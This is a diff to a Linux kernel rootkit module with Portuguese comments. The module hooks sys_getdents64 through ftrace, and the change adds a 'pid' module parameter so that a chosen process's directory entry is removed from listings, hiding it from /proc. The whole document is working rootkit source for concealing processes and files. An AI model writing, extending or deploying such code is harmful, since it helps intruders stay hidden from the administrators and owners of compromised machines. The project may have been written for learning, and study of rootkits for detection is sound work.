@@ -14,6 +14,7 @@
 #include <linux/slab.h>
 #include <linux/namei.h>
 #include <linux/ftrace.h>
+#include <linux/dirent.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Breno Nascimento");
@@ -23,7 +24,7 @@ MODULE_VERSION("0.02");
 // x64 tem prefixo especifico em suas syscalls
 #define NOME_SYSCALL(syscall) ("__x64_" syscall)
 
-#define ROOTKIT_FILE "temp350"
+#define ROOTKIT_FILE "arquivo_secreto"
 #define ROOTKIT_FUNC NOME_SYSCALL("sys_getdents64")
 
 struct ftrace_hook {
@@ -36,6 +37,9 @@ struct ftrace_hook {
 };
 static struct ftrace_hook hook1;
 static struct ftrace_hook hook2;
+static char* pid = "0";
+module_param(pid, charp, S_IRUGO);
+MODULE_PARM_DESC(pid, "PID do processo a esconder");
 
 // compilador fica com raiva se nao colocar prototipo antes da declaracao de funcao ja que o kernel segue 
 // a metodologia POE (Programacao Orientada a Espaguetes)
@@ -52,7 +56,7 @@ static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, s
 
 static unsigned long * __sys_call_table; // endereco da nossa tabela de syscall
 
-// precisamos redeclarar a syscall original da forma que e' definida no kernel pra poder reusar ela posteriormente
+// precisamos redeclarar a syscall original da forma que e' definida no kernel pra poder reusar ela posteriormente 
 // antigamente, os argumentos eram passados pra syscall do jeito que aparenta ser (pela definicao do kernel).
 // porem, desde o kernel 4.17.0, isso mudou pra que os registradores fossem copiados pra uma struct pt_regs e ai sim
 // serem passados como unico argumento pra syscall
@@ -87,10 +91,6 @@ asmlinkage int hook_kill(struct pt_regs *regs) {
     }
 }
 
-#include <linux/dirent.h>
-
-#define PREFIX "boogaloo"
-
 asmlinkage int hook_func(const struct pt_regs *regs)
 {
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
@@ -116,7 +116,8 @@ asmlinkage int hook_func(const struct pt_regs *regs)
     while (offset < ret) {
         current_dir = (void*)dirent_ker + offset;
         // printk(KERN_INFO "rootkit: item: %s\n", current_dir->d_name);
-        if (strcmp(ROOTKIT_FILE, current_dir->d_name) == 0) {
+        // if (strcmp(pid, current_dir->d_name) == 0 && strcmp(pid, "0") != 0) {
+        if (strcmp(pid, current_dir->d_name) == 0) {
             printk(KERN_ALERT "rootkit: MATCH FILE\n");
 
             previous_dir->d_reclen += current_dir->d_reclen;
